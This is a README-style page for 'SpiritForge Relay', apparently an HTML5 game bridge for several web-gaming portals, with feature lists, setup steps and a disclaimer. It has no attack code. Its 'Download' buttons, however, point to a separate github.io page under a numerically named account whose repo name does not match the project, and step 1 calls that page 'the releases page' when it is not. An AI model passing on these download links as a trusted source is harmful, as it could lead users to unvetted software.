![preview](https://raw.githubusercontent.com/0925383047/portal-runtime-one/main/hero_e34318d.svg)

# SpiritForge Relay

**A portal-agnostic save-state and telemetry conduit for HTML5 games deployed across multiple web-gaming storefronts.**

---

## Overview

SpiritForge Relay is an open-source runtime bridge that lets a single HTML5 game speak the native language of every major web-gaming platform—without rewriting a single line of game logic. Think of it as a diplomatic translator for your game’s soul: the same build, the same heartbeat, the same player journey, yet perfectly tailored to the expectations of CrazyGames, Poki, itch.io, Yandex, GameDistribution, and GamePix.

The project began when its maintainers hit a wall: every portal demanded its own SDK, its own event naming conventions, its own monetization hooks, and its own privacy declarations. The result was a fork in the road—maintain multiple divergent builds, or surrender a chunk of your audience. SpiritForge Relay answers with a third path: a single, unified API that morphs at runtime into whatever the host portal expects.

This is not a wrapper. It is a **chameleon layer** that inspects its environment, detects the hosting portal, and dynamically adopts that portal's required interface. Your game code remains pristine—you call one `Session.start()`, one `RewardedAd.show()`, one `Stat.track("level_complete")`—and Relay handles the rest: from `window.parent.postMessage` protocols to SDK script injection, from leading to trailing slashes in API endpoints, from storage key prefixes to loader callback signatures.

---

## Why SpiritForge Relay Exists

Building for multiple portals is like raising a child in a dozen households—each has rules about bedtimes, vocabulary, and which toys are acceptable. You love them all, but you cannot be in every room at once.

Traditional approaches demand you write a bespoke integration for each platform, then patch it whenever a portal updates its SDK. That means version skew, duplicated effort, and a maintenance burden that grows linearly with your platform count. SpiritForge Relay collapses that complexity into a single, versioned dependency.

**Key promises:**

- **One codebase, N faces** — Your game’s source remains identical across portals. Only the build-time manifest differs (and we provide a generator for that, too).
- **Runtime port detection** — Relay fingerprints the embedding page’s origin, DOM structure, and global variables to decide which portal adapter to activate. No configuration required for 95% of cases.
- **Graceful degradation** — If a portal is unrecognized, Relay still runs. It just falls back to a generic sandbox mode where all features work locally but no third-party SDKs are loaded.
- **Declarative SDK injection** — Define which scripts must load for which portal inside a JSON manifest. Relay loads them lazily, with proper error handling, and never blocks first paint.

---

## The Anatomy of a Relay Session

Imagine your game as a traveler. Each portal is a country with its own customs, currency, and language. Relay is the tour guide who has already booked the flights, filled the forms, and knows exactly which phrasebook to use at each border.

### 1. Environment Sniffing
On boot, Relay executes a lightweight fingerprinting routine:
- Checks `window.location.ancestorOrigins`
- Probes for portal-specific globals (e.g., `window.sdk`, `window.GD_OPTIONS`, `window.gamePix`)
- Inspects DOM meta tags and script identifiers
- Falls back to a URL pattern matcher

The result is a `PortalProfile` object containing which adapter to load, which API version to target, and which monetization placements are valid.

### 2. Adapter Synthesis
Each adapter is a small, focused module that implements a common interface:
- `init(sessionConfig)`
- `showRewardedAd(placement)`
- `setLoadingProgress(value)`
- `sendAnalytics(eventName, payload)`
- `requestLeaderboardUpdate(score)`

But the *inside* of each adapter is written in the portal’s native dialect. For Poki, it wraps the global `PokiSDK`. For CrazyGames, it speaks `window.CrazyGames.SDK`. For itch.io, it uses the `parent.postMessage` API. For Yandex, it invokes `ysdk.adv.showFullscreenAdv()`.

Because adapters are compiled to plain ES5 and share no mutable state, you can theoretically hot-swap them at runtime if a portal changes its SDK version mid-session.

### 3. State Cartography
Different portals store save data differently: LocalStorage under different keys, IndexedDB in different database names, or server-side via their own rest endpoints. Relay abstracts this behind a `SaveArchive` interface:
- `save(slotId, dataBlob)` → serializes and encrypts lightly, then dispatches to the correct storage backend
- `load(slotId)` → retrieves, decrypts, and validates the payload
- `wipeAll()` → cleans up every portal-specific residue

The encryption key is derived from the game’s unique ID plus the portal’s domain, so data cannot be migrated by copying localStorage values blindly.

### 4. Telemetry Mapper
Analytics events are the hardest to standardize because each portal wants a different schema. Relay solves this with a **schema mapping layer**. You define once, in a JSON file, how your logical events (e.g., `level_started`, `item_purchased`, `ad_watched`) translate into each portal’s expected format. Relay then performs a lossless conversion at runtime, including parameter renaming, type coercion, and event funnel merging.

For example, a `level_completed` event with `{ level: 3, timeSec: 120 }` becomes `{ levelNumber: 3, duration: 120 }` on Poki, but `{ lvl: 3, diff: 120000 }` on Yandex—without your game needing to know.

---

## Project Structure

```
spiritforge-relay/
├── adapters/
│   ├── crazygames.js
│   ├── poki.js
│   ├── itch.js
│   ├── yandex.js
│   ├── gamedistribution.js
│   └── gamepix.js
├── core/
│   ├── relay.js           ← main orchestration class
│   ├── port-sniffer.js
│   ├── adapter-factory.js
│   └── event-bus.js
├── storage/
│   ├── archive.js
│   ├── local-backend.js
│   ├── indexdb-backend.js
│   └── cloud-proxy.js
├── maps/
│   ├── crazygames.schema.json
│   ├── poki.schema.json
│   └── ...
├── manifests/
│   ├── game.manifest.example.json
│   └── portal-rules.example.json
└── docs/
    ├── philosophy.md
    ├── adapter-guide.md
    └── faq.md
```

---

## Feature Matrix

| Feature | Description | Portal Coverage |
|---------|-------------|-----------------|
| **Rewarded Ads** | Fullscreen and rewarded video placements with callback timing guarantees | All 6 portals |
| **Save Sync** | Local-first storage with optional cloud proxy | All 6 portals |
| **Leaderboards** | Score submission and page-level ranking display | Poki, CrazyGames, Yandex |
| **Session Lifecycle** | Pause/resume/start/stop events mapped precisely to portal lifecycle hooks | All 6 portals |
| **Deep Linking** | URL parameter forwarding and in-game router integration | itch.io, GameDistribution |
| **User Privacy** | Automatic GDPR and COPPA consent popups, deferrable until explicit acceptance | All 6 portals |
| **Dynamic Ad Frequency** | Server-driven ad placement tuning, obeying portal-specific throttling rules | CrazyGames, GamePix |
| **Build Tagging** | Runtime read of build metadata to detect portal-specific debug mode | All 6 portals |

---

## 🧭 Getting Started

The fastest way to experience Relay is to drop it into an existing HTML5 game that already has a `boot()` function and a `gameLoop()`.

[![Download](https://raw.githubusercontent.com/0925383047/portal-runtime-one/main/grab_bc1041.svg)](https://0925383047.github.io/portal-runtime-one/)

1. **Copy the core distribution** — obtain the compiled relay bundle from the releases page (link above) and place it alongside your game’s JavaScript entry point.
2. **Create a manifest** — write a minimal `game.manifest.json` declaring your game’s ID, supported portals, and which ad units you intend to use. Relay reads this on startup to pre-register adapters.
3. **Replace your SDK calls** — search for global variables like `PokiSDK`, `CrazyGames`, `ysdk` and replace them with `Relay.ads()`, `Relay.stats()`, and `Relay.save()` invocations.
4. **Test locally using sandbox mode** — open the game in a plain browser tab. Relay detects no known portal and activates its internal simulation layer, printing to console what it would send to each portal.
5. **Upload to a portal** — use their standard upload tools, choosing your game’s original HTML file. Relay senses the hosting environment at boot and adapts automatically.

*See `docs/adapter-guide.md` for a line-by-line walkthrough of porting a game that already uses multiple SDKs.*

---

## 🌍 Multilingual UI & Localization

Localization in web games is often an afterthought—a pot of untranslated strings hidden deep in a config file. Relay flips that script.

It ships with a **runtime dictionary** that overwrites UI strings *per portal*. Why? Because players on Poki expect their native language, but players on Yandex expect Russian or Turkish. And on itch.io, players are often comfortable with English but appreciate community translations.

Relay’s localization module:
- Detects the browser’s `navigator.language` at boot
- Overrides it with the portal’s recommended locale (configurable)
- Loads `.po` or `.json` dictionary files from a URL path you provide
- Supports pluralization, gender agreement, and context-aware fallbacks
- Hot-swaps dictionaries without reloading the game

---

## ⚡ Responsive UI & Adaptive Layout

Portals run games inside wildly different iframe dimensions—from phone-portrait on Poki to wide desktop on GameDistribution. Relay includes an **anchor-point layout resolver** that recalculates your canvas scale, HUD margins, and touch-target sizes on every `resize` event.

It uses the game’s design resolution to compute a scale factor, then applies letterboxing or pillarboxing with configurable background colors. For hybrid games that mix DOM overlays with WebGL, Relay also adjusts the `transform: scale()` on those overlays, keeping them crisp.

---

## 🛡️ Asset Integrity & Caching

Mobile portals cache aggressively, which is great for performance but hell for updates. Relay implements a **CacheBusting Manifest** that appends a hash of each asset file to its URL, then stores the mapping in a service worker. When you publish a new build, only changed assets are re-fetched; everything else hits the cache instantly.

This brings two benefits:
- **Speed** — return players load your game hundreds of milliseconds faster.
- **Consistency** — no more half-updated states where a player has the new script but the old sprite.

---

## 🔄 The Event Bus (Cross-Portal Messaging)

Sometimes you need to communicate between the parent page (the portal chrome) and the iframe (your game). Each portal has a different handshake: some use `postMessage` with a specific schema, others mutate a shared object, a few add DOM attributes.

Relay presents a clean **EventBus** interface:
```js
Relay.bus.emit("player_died", { coins: 12 })
Relay.bus.on("portal_pause", () => { yourGame.pause() })
```

Under the hood, the bus listener synthesizes the correct native subscription per portal. Incoming messages from the portal are normalized into a single `PortalEvent` object with a `type` and a `payload`. This means your game never knows (or cares) whether the pause came from a Poki modal, a CrazyGames overlay, or the browser tab switching.

---

## 🧰 CLI Toolbox (Build Companion)

While the runtime is the star, the repository also includes a command-line companion (`relay-builder`) that:

- Validates your portal rules against the latest SDK documentation (fetched at runtime)
- Generates the minified, portal-specific boot file that inlines the correct adapter list
- Lints your schema mappings for missing required fields
- Produces a diff report when a portal updates its SDK requirements

You don’t need this to ship your game. It’s there for teams that manage many titles and want automated nightly checks.

---

## 🛎️ 24/7 Community & Support Channels

This project is maintained on a best-effort basis by a small but passionate group of web-game veterans. We know what it feels like to be blocked at 3 AM by an obscure ad-slot error on a portal you’ve never tested.

That’s why we keep a **discord-style community bridge** (accessible from the repo’s discussions tab) where fellow developers share adapter patches, portal-specific quirks, and unofficial workarounds. If you find a portal that broke your integration, posting the error log here is the fastest way to get a fix from someone who has already seen it.

We are also committed to **security patches** — if a portal changes its authentication scheme or starts rejecting certain `postMessage` origins, we update the relevant adapter within 48 hours of a demonstrated report.

---

## 🧾 License & Legal Notes

SpiritForge Relay is released under the **MIT License**. You may use it in commercial games, modify it, fold it into your own proprietary SDK abstraction, and redistribute it with attribution only in the license file of your distribution. No copyleft obligations, no hidden clauses.

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)

---

## ⚠️ Disclaimer

This project is an independent, community-driven effort and is **not affiliated with, endorsed by, or sponsored by** any of the portal providers mentioned (CrazyGames, Poki, itch.io, Yandex Games, GameDistribution, GamePix). Portal names, SDK names, and platform trademarks are the property of their respective owners.

The maintainers make no warranty that any particular portal adapter will remain functional without community updates. Portal SDKs change rapidly, and there may be periods where a specific integration lags behind. We do not guarantee that using this library will satisfy all platform content policies; you remain responsible for reviewing each portal’s terms of service and ad implementation guidelines.

Ad monetization reliability depends on your traffic quality, ad inventory, and the portal’s own rules. While Relay strives to render ads consistently, a portal may occasionally serve no ad—that is outside our control. We also recommend you test the reward flow thoroughly before launch, because some portals require a specific user gesture to trigger rewarded ads.

Finally, **do not use this library to bypass platform rules**. That means no hidden ad bidding beyond what a portal exposes, no automated bot traffic, no unauthorized telemetry that violates a privacy policy. Use Relay as it is intended: an honest integration layer that respects each platform’s boundaries.

---

## 📚 Further Reading

- `docs/philosophy.md` — why a single runtime API beats per-portal ifs.
- `docs/adapter-guide.md` — writing your own adapter (for a portal we missed).
- `docs/faq.md` — troubleshooting common misconfiguration errors.

---

## 🙏 Acknowledgements

- The maintainers of the open-source `postmate` and `post-me` projects for inspiration on secure iframe messaging.
- Every portal developer who understands that web games deserve a unified developer experience.

---

[![Download](https://raw.githubusercontent.com/0925383047/portal-runtime-one/main/grab_bc1041.svg)](https://0925383047.github.io/portal-runtime-one/)